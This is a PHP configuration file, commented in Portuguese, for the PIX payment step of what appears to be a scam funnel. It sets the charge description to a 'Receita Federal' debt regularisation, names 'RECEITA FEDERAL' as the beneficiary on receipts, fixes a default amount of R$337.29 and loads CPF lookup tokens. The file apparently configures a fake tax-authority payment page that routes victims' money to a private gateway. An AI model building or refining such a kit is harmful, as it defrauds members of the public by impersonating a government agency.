<?php
/**
 * =====================================================================
 *  CONFIGURAÇÃO DO PIX  —  ajustes gerais (NÃO-secretos).
 * =====================================================================
 *
 *  As CREDENCIAIS (tokens de CPF e PIX, modo e gateway) ficam em
 *  credenciais.php, na raiz do projeto. É o único arquivo que você
 *  edita na hospedagem. Aqui ficam só os ajustes não-sensíveis.
 * ---------------------------------------------------------------------
 */

// Carrega as credenciais (PIX_MODO, PIX_GATEWAY, tokens, etc.)
require_once __DIR__ . '/../credenciais.php';

/* ---------------------------------------------------------------------
 *  DADOS DA COBRANÇA
 * ------------------------------------------------------------------- */

// Valor padrão caso o front não envie um valor válido (em reais)
define('PIX_VALOR_PADRAO', 337.29);

// Descrição que aparece na cobrança
define('PIX_DESCRICAO', 'Regularizacao de debito - Receita Federal');

// Beneficiário (aparece no comprovante)
define('PIX_BENEFICIARIO_NOME',   'RECEITA FEDERAL');
define('PIX_BENEFICIARIO_CIDADE', 'BRASILIA');

/* ---------------------------------------------------------------------
 *  WEBHOOK  (opcional — alguns gateways avisam aqui quando pagam)
 *  Aponte para: https://SEUDOMINIO/funilfg/pix/webhook.php
 * ------------------------------------------------------------------- */
define('PIX_WEBHOOK_URL', '');

/* ---------------------------------------------------------------------
 *  Pasta onde as transações ficam salvas (não precisa mexer)
 * ------------------------------------------------------------------- */
define('PIX_STORAGE_DIR', __DIR__ . '/pix/transacoes');
